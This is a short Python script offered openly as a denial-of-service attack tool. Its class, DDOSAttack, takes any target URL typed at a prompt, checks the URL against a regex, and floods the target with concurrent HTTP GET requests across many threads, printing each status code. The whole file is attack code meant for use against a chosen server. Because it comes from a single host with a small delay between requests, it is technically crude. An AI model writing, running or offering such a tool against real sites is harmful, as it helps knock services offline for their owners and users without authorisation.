import requests
import threading
import time
import re

class DDOSAttack:
    def __init__(self, target_url, number_of_requests=100):
        """
        Initialize the DDOSAttack class with necessary parameters.
        :param target_url: The URL of the target server.
        :param number_of_requests: Number of requests to send in the attack.
        """
        if not self.validate_url(target_url):
            raise ValueError(f"Invalid URL: {target_url}")

        self.target_url = target_url
        self.number_of_requests = number_of_requests

    def validate_url(self, url):
        """
        Validate the URL to ensure it's a properly formatted HTTP or HTTPS URL.
        :param url: The URL to validate.
        :return: True if the URL is valid, False otherwise.
        """
        url_regex = re.compile(
            r'^(https?://)'
            r'(([A-Za-z0-9-]+\.)+[A-Za-z]{2,6})'
            r'(:[0-9]{1,5})?'
            r'(/.*)?$', re.IGNORECASE)
        return url_regex.match(url) is not None

    def send_request(self):
        """Send a single HTTP GET request to the target URL."""
        try:
            response = requests.get(self.target_url)
            print(f"Request sent! Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    def run(self):
        """
        Run the DDoS attack by sending multiple requests.
        """
        print(f"Starting DDoS Attack on {self.target_url} with {self.number_of_requests} requests...")
        
        threads = []

        for i in range(self.number_of_requests):
            thread = threading.Thread(target=self.send_request)
            threads.append(thread)
            thread.start()
            time.sleep(0.1)

        for thread in threads:
            thread.join()

        print("DDoS Attack complete.")


if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    number_of_requests = input("Enter the number of requests to send: ")

    try:
        ddos = DDOSAttack(target_url, int(number_of_requests))
        ddos.run()
    except ValueError as e:
        print(e)
